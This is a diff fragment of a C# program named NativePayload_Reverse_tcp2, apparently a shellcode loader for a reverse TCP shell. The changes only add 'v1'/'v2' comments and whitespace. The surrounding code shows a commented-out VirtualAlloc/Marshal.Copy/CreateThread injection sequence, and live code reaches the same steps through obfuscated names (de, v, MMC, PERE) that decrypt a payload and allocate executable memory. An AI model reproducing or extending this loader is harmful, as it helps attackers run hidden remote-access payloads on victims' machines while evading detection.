@@ -141,6 +141,7 @@ namespace NativePayload_Reverse_tcp2
                         Console.Write(".");
                     }
                 }
+	/// v1
         //UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
         //MEM_COMMIT, PAGE_EXECUTE_READWRITE);
         //Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
@@ -150,6 +151,8 @@ namespace NativePayload_Reverse_tcp2
         //// execute native code
         //hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
         //WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+		/// v2
                 Hide.code.a.ftp = de(Hide.code.a._j_, Hide.code.a.bt);
                 Console.WriteLine(" Bingo ;)");
                 Hide.code.b.funcAddr = v(0, (UInt32)Hide.code.a.ftp.Length, Hide.hide2.hide3.MMC, Hide.hide2.hide3.PERE);
@@ -166,18 +169,15 @@ namespace NativePayload_Reverse_tcp2
                     }
 
                 }
-                
-            
+                          
             }
             catch (Exception e )
             {
                 Console.WriteLine(e.Message);
                 
             }
-            
-           
+                       
         }
-
       
     }
 }
